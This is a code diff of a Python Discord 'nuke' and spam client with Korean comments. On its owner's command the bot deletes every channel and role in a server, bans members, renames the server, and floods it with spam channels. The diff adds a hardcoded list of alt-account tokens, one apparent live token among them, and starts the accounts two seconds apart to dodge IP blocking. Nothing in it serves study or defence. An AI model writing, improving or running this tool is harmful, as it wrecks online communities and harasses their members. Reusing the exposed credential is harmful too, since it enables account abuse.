@@ -4,32 +4,11 @@ import asyncio
 import os
 import threading
 import time
-from flask import Flask
 
 # ==========================================
-# Render가 봇을 재우지 않게 만드는 가짜 웹사이트
+# ★ 니 부계 토큰들을 여기에 넣어라 (콤마로 구분) ★
 # ==========================================
-app = Flask('')
-
-@app.route('/')
-def home():
-    return "봇 살아있음 ㅋㅋ"
-
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
-def keep_alive():
-    t = threading.Thread(target=run)
-    t.daemon = True
-    t.start()
-
-# ==========================================
-# ★ 렌더 환경변수에서 토큰 불러오기 ★
-# ==========================================
-TOKEN = os.getenv("DISCORD_TOKEN") 
-if not TOKEN:
-    print("❌ 렌더 Environment 탭에 DISCORD_TOKEN 값을 넣어주세요.")
-    exit(1)
+TOKENS = [    "MTU2ODU4ODYxMDAyODk2NTkxMA.GSthFR.NzQOwTCHNOvtSyCSBDdPeDEx0MIFJ_YEVsOfnw"]
 
 # ★ 니 디스코드 ID ★
 OWNER_ID = 1568590045286244358
@@ -75,7 +54,6 @@ A
 https://cdn.discordapp.com/attachments/1527944035816443934/1548286685413113956/lv_0_20260912195758.gif
 https://cdn.discordapp.com/attachments/1531280401497329795/1531631114265821296/1759806656222.gif"""
 
-# ★ 니가 요청한 특수문자 채널 이름 적용 ★
 nuke_channel_names = [
     "▟┃▔┃⬤ 현월을 찬양해라",
     "︻╦╤─── 현월업업",
@@ -105,7 +83,7 @@ class SpamClient(discord.Client):
     async def on_message(self, message):
         if message.author.id != self.user.id and message.author.id != OWNER_ID: return
 
-        # 1. 전체 중지 (!STOP) - 누크도 즉시 중단
+        # 1. 전체 중지 (!STOP)
         if message.content == STOP_TRIGGER:
             self.is_spamming = False
             self.is_pinging = False
@@ -125,11 +103,9 @@ class SpamClient(discord.Client):
                 try: extra_count = int(parts[1])
                 except: pass
 
-            # 지울 채널/역할 미리 저장
             channels_to_delete = list(guild.channels)
             roles_to_delete = [r for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
             
-            # 채널 삭제 (한 번만 병렬로)
             async def delete_channel(ch):
                 if not self.is_nuking: return
                 try: await ch.delete()
@@ -138,7 +114,6 @@ class SpamClient(discord.Client):
             
             if not self.is_nuking: return
             
-            # 역할 삭제
             async def delete_role(role):
                 if not self.is_nuking: return
                 try: await role.delete()
@@ -147,7 +122,6 @@ class SpamClient(discord.Client):
                     
             if not self.is_nuking: return
             
-            # 유저 밴
             async def ban_member(m):
                 if not self.is_nuking: return
                 try:
@@ -160,7 +134,6 @@ class SpamClient(discord.Client):
             try: await guild.edit(name="현월 서버 터짐 ㅋㅋ")
             except: pass
 
-            # 채널 생성 및 도배
             async def create_spam_channel(ch_name):
                 if not self.is_nuking: return
                 try:
@@ -169,16 +142,13 @@ class SpamClient(discord.Client):
                 except: pass
 
             tasks = []
-            # 기본 30세트 (니가 원하면 이 숫자 조절해라)
             for _ in range(30):
                 for ch_name in nuke_channel_names:
                     tasks.append(create_spam_channel(ch_name))
             
-            # 추가 숫자만큼 생성
             for _ in range(extra_count):
                 tasks.append(create_spam_channel(random.choice(nuke_channel_names)))
 
-            # 10개씩 끊어서 병렬 생성 (중간에 STOP 먹히게)
             for i in range(0, len(tasks), 10):
                 if not self.is_nuking: return
                 await asyncio.gather(*tasks[i:i+10])
@@ -269,7 +239,17 @@ class SpamClient(discord.Client):
                 except Exception: await asyncio.sleep(1)
             return
 
-if __name__ == "__main__":
-    keep_alive()
+# ==========================================
+# 토큰들을 2초 간격으로 순차 실행 (IP 차단 방지)
+# ==========================================
+def run_bot(token):
     client = SpamClient()
-    client.run(TOKEN)
+    client.run(token)
+
+for token in TOKENS:
+    threading.Thread(target=run_bot, args=(token,), daemon=True).start()
+    time.sleep(2) # 토큰 하나당 2초 대기
+
+# 봇들이 꺼지지 않게 무한 대기
+while True:
+    time.sleep(1)
